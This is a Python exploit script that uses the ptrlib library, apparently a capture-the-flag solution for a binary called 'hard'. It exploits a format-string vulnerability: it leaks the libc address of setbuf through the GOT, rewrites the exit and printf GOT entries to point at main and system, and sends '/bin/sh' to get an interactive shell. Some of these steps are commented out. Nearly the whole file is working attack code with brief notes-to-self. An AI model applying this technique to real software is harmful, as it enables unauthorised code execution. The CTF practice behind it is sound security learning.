from ptrlib import *

binpath = './hard'
libcpath = '/usr/lib/libc.so.6'

proc = Process(binpath)
elf = ELF(binpath)
libc = ELF(libcpath)

# could't leak __libc_start_main, so leak setbuf
# because setbuf is called onece, setbuf_got points the libc_setbuf
# it's not a 64bit data so, make it in to 64bit data at first, and then send it
# b"%7$s" (= 0x25 0x37 0x24 0x73 0x00)
# u64(b"%7$s")  (= 0x25 0x37 0x24 0x73 0x00 0x00 0x00 0x00)

# !!!!!!coution!!!!!!!
# puts() send \n after "" so, if when receve() will receve \n
# and recve 0xa.
# don't forget to sendafter("\n")!!!!!

def leak_libc():
    setbuf_got_address = elf.got("setbuf")
    print("setbuf_got_address: ", hex(setbuf_got_address))

    payload = flat(
            [
                u64(b"%7$s"),
                setbuf_got_address
            ],
            map=p64
    )

    proc.sendafter("Input message\n", payload)
    setbuf_libc_address = u64(proc.recv(6))
    print("setbuf_libc_address: ", hex(setbuf_libc_address))
    offset_setbuf = libc.symbol("setbuf")
    print("libc.base: ", hex(libc.base))
    libc.base = setbuf_libc_address - offset_setbuf
    print("setbuf_libc_address - offset_setbuf: ", hex(setbuf_libc_address - offset_setbuf))


def exit2main():
    exit_got_address = elf.got("exit")
    main_address = elf.symbol("main")
    print("exit_got_address: ", hex(exit_got_address))
    print("main_address: ", hex(main_address))
    writes = {
        exit_got_address: main_address
    }
    payload = fsb(
        6, writes, bs=2, bits=64, size=4
    )
    proc.sendafter("Input message", payload)

def printf2system():
    printf_got_address = elf.got("printf")
    system_address = libc.symbol("system")
    print("printf_got_address: ", hex(printf_got_address))
    print("system_address: ", hex(system_address))
    writes = {
        printf_got_address: system_address
    }
    payload = fsb(
        6, writes, bs=2, bits=64, size=4
    )
    proc.sendafter("Input message", payload)

def binsh2rdi():
    print("/bin/sh: ", p64(u64("/bin/sh")))
    input()
    proc.sendafter("Input message", p64(u64("/bin/sh")))
    # proc.sendafter("Input message\n", b"/bin/sh\x00")

def attack():
    leak_libc()
    # exit2main()
    # printf2system()
    # binsh2rdi()
    proc.interactive()


if __name__ == "__main__":
    attack()
